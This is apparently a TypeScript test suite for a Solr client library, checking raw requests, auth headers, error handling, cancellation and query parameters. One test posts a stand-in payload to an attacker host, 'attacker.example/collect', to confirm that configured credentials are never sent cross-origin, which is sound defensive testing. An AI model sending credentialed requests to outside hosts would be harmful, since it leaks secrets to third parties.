import { test } from "node:test";
import assert from "node:assert/strict";
import {
  createSolrClient,
  SolrAbortError,
  SolrHttpError
} from "../src/index.js";

test("raw requests preserve custom method, body, headers, and same-origin absolute paths", async () => {
  let requestedUrl = "";
  let method = "";
  let body: BodyInit | null | undefined;
  let contentType: string | null = null;
  let authorization: string | null = null;
  const client = createSolrClient({
    baseUrl: "https://solr.example.test/proxy",
    auth: { type: "bearer", token: "test-token" },
    fetch: async (input, init) => {
      requestedUrl = String(input);
      method = String(init?.method);
      body = init?.body;
      const headers = new Headers(init?.headers);
      contentType = headers.get("content-type");
      authorization = headers.get("authorization");
      return new Response("accepted");
    }
  });

  const xml = "<add><doc><field name=\"id\">one</field></doc></add>";
  const response = await client.requestRaw("https://solr.example.test/solr/catalog/update", {
    method: "POST",
    body: xml,
    headers: { "content-type": "application/xml" }
  });

  assert.equal(requestedUrl, "https://solr.example.test/solr/catalog/update");
  assert.equal(method, "POST");
  assert.equal(body, xml);
  assert.equal(contentType, "application/xml");
  assert.equal(authorization, "Bearer test-token");
  assert.equal(await response.text(), "accepted");
});

test("raw requests reject cross-origin URLs before sending configured credentials", async () => {
  let fetchCalled = false;
  const client = createSolrClient({
    baseUrl: "https://solr.example.test",
    auth: { type: "basic", username: "solr", password: "secret" },
    fetch: async () => {
      fetchCalled = true;
      return new Response("should not be called");
    }
  });

  await assert.rejects(
    client.requestRaw("https://attacker.example/collect", { method: "POST", body: "payload" }),
    /configured Solr origin/
  );
  assert.equal(fetchCalled, false);
});

test("raw requests reject embedded credentials and URL fragments", async () => {
  let fetchCalled = false;
  const client = createSolrClient({
    baseUrl: "https://solr.example.test",
    fetch: async () => {
      fetchCalled = true;
      return new Response("should not be called");
    }
  });

  await assert.rejects(
    client.requestRaw("https://user:password@solr.example.test/solr/custom"),
    /must not include credentials or a fragment/
  );
  await assert.rejects(
    client.requestRaw("https://solr.example.test/solr/custom#fragment"),
    /must not include credentials or a fragment/
  );
  assert.equal(fetchCalled, false);
});

test("raw request HTTP failures use SolrHttpError", async () => {
  const client = createSolrClient({
    baseUrl: "https://solr.example.test",
    fetch: async () => new Response("forbidden", { status: 403, statusText: "Forbidden" })
  });

  await assert.rejects(
    client.requestRaw("/solr/catalog/custom", { method: "GET" }),
    (error: unknown) => {
      assert.ok(error instanceof SolrHttpError);
      assert.equal(error.status, 403);
      assert.equal(error.endpoint, "https://solr.example.test/solr/catalog/custom");
      assert.equal(error.body, "forbidden");
      return true;
    }
  );
});

test("raw response streams retain caller cancellation until the body is consumed", async () => {
  const controller = new AbortController();
  const reason = new Error("stop raw response");
  const client = createSolrClient({
    baseUrl: "https://solr.example.test",
    timeoutMs: 1000,
    fetch: async (_input, init) => new Response(new ReadableStream<Uint8Array>({
      start(streamController) {
        init?.signal?.addEventListener("abort", () => streamController.error(init.signal?.reason), { once: true });
      }
    }))
  });

  const response = await client.requestRaw("/solr/catalog/export", { signal: controller.signal });
  const reader = response.body!.getReader();
  const pendingRead = reader.read();
  controller.abort(reason);

  await assert.rejects(pendingRead, SolrAbortError);
});


test("custom handlers preserve repeated query parameters and unknown JSON response fields", async () => {
  let requestedUrl = "";
  let requestedMethod = "";
  const query = new URLSearchParams();
  query.append("fq", "type:product");
  query.append("fq", "status:active");
  query.append("custom.flag", "true");

  const payload = {
    responseHeader: { status: 0 },
    pluginResponse: { suggestions: ["one", "two"] },
    futurePluginField: { enabled: true }
  };
  const client = createSolrClient({
    baseUrl: "https://solr.example.test",
    fetch: async (input, init) => {
      requestedUrl = String(input);
      requestedMethod = String(init?.method);
      return new Response(JSON.stringify(payload), {
        headers: { "content-type": "application/json" }
      });
    }
  });

  const result = await client.request<typeof payload>("/solr/catalog/custom-handler", { query });
  const url = new URL(requestedUrl);
  assert.equal(requestedMethod, "GET");
  assert.equal(url.pathname, "/solr/catalog/custom-handler");
  assert.deepEqual(url.searchParams.getAll("fq"), ["type:product", "status:active"]);
  assert.equal(url.searchParams.get("custom.flag"), "true");
  assert.deepEqual(result, payload);
  assert.deepEqual(result.futurePluginField, { enabled: true });
});


test("requestRaw uses the configured codec for JSON bodies and structured HTTP errors", async () => {
  let stringifyCalls = 0;
  let parseCalls = 0;
  let requestBody = "";
  const client = createSolrClient({
    baseUrl: "https://solr.example.test",
    jsonCodec: {
      parse(text) {
        parseCalls++;
        return JSON.parse(text);
      },
      stringify(value) {
        stringifyCalls++;
        return JSON.stringify(value);
      }
    },
    fetch: async (_input, init) => {
      requestBody = String(init?.body);
      return new Response('{"error":{"code":400,"msg":"bad request"}}', {
        status: 400,
        statusText: "Bad Request",
        headers: { "content-type": "application/json" }
      });
    }
  });

  await assert.rejects(
    client.requestRaw("/solr/catalog/update", { method: "POST", body: { add: [{ doc: { id: "one" } }] } }),
    (error: unknown) => {
      assert.ok(error instanceof SolrHttpError);
      assert.equal(error.errorResponse?.error && typeof error.errorResponse.error === "object"
        ? error.errorResponse.error.msg
        : error.errorResponse?.error, "bad request");
      return true;
    }
  );
  assert.equal(stringifyCalls, 1);
  assert.equal(parseCalls, 1);
  assert.equal(requestBody, '{"add":[{"doc":{"id":"one"}}]}');
});
